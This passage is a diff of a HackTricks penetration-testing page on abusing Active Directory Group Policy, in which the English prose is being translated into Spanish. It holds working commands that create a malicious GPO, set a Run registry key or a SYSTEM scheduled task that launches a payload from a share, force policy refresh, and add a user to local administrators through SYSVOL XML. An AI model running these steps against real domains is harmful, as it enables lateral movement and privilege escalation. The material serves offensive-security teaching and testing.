 {% endhint %}
-
 ```powershell
 # Create new GPO and link it with the OU Workstrations
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
@@ -401,31 +420,28 @@ New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,
 ## Search a shared folder where you can write and all the computers affected can read
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
+Este payload, después de que se actualice el GPO, necesitará que alguien inicie sesión en la computadora.
 
-This payload, after the GPO is updated, will need also someone to login inside the computer.
-
-### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abuse GPO**
+### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abuso de GPO**
 
 {% hint style="info" %}
-It cannot create GPOs, so we must still do that with RSAT or modify one we already have write access to.
+No puede crear GPOs, por lo que todavía debemos hacerlo con RSAT o modificar uno al que ya tengamos acceso de escritura.
 {% endhint %}
-
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
+### Actualización forzada de políticas <a href="#force-policy-update" id="force-policy-update"></a>
 
-### Force Policy Update <a href="#force-policy-update" id="force-policy-update"></a>
+Las actualizaciones abusivas anteriores de **GPO se recargan** aproximadamente cada 90 minutos.\
+Si tienes acceso al equipo, puedes forzarlo con `gpupdate /force`.
 
-The previous abusive **GPO updates are reloaded** roughly each 90 minutes.\
-if you have access to the computer you can force it with `gpupdate /force` .
+### Bajo el capó <a href="#under-the-hood" id="under-the-hood"></a>
 
-### Under the hood <a href="#under-the-hood" id="under-the-hood"></a>
-
-If we observe the Scheduled Tasks of the `Misconfigured Policy` GPO, we can see our `evilTask` sitting there:
+Si observamos las Tareas Programadas de la GPO `Política mal configurada`, podemos ver nuestra `evilTask` sentada allí:
 
 ![](../../../.gitbook/assets/a22.png)
 
-Below is the XML file that got created by `New-GPOImmediateTask` that represents our evil scheduled task in the GPO:
+A continuación se muestra el archivo XML que se creó con `New-GPOImmediateTask` que representa nuestra tarea programada maliciosa en la GPO:
 
 {% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
 ```markup
@@ -488,9 +504,9 @@ Below is the XML file that got created by `New-GPOImmediateTask` that represents
 ```
 {% endcode %}
 
-### Users and Groups <a href="#users-and-groups" id="users-and-groups"></a>
+### Usuarios y Grupos <a href="#users-and-groups" id="users-and-groups"></a>
 
-The same privilege escalation could be achieved by abusing the GPO Users and Groups feature. Note in the below file, line 6 where the user `spotless` is added to the local `administrators` group - we could change the user to something else, add another one or even add the user to another group/multiple groups since we can amend the policy configuration file in the shown location due to the GPO delegation assigned to our user `spotless`:
+La misma escalada de privilegios se puede lograr abusando de la función de Usuarios y Grupos de GPO. Tenga en cuenta en el archivo a continuación, en la línea 6, donde se agrega el usuario `spotless` al grupo local `administrators` - podríamos cambiar el usuario por otro, agregar otro o incluso agregar el usuario a otro grupo / múltiples grupos ya que podemos modificar el archivo de configuración de la política en la ubicación mostrada debido a la delegación de GPO asignada a nuestro usuario `spotless`:
 
 {% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
 ```markup
@@ -507,11 +523,11 @@ The same privilege escalation could be achieved by abusing the GPO Users and Gro
 ```
 {% endcode %}
 
-Additionally, we could think about leveraging logon/logoff scripts, using registry for autoruns, installing .msi, edit services and similar code execution avenues.
+Además, podríamos pensar en aprovechar los scripts de inicio / cierre de sesión, usar el registro para autoruns, instalar .msi, editar servicios y vías similares de ejecución de código.
 
-## References
+## Referencias
 
-* Initially, this information was mostly copied from [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
+* Inicialmente, esta información fue en su mayoría copiada de [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 * [https://wald0.com/?p=112](https://wald0.com/?p=112)
 * [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
 * [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
@@ -522,10 +538,10 @@ Additionally, we could think about leveraging logon/logoff scripts, using regist
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
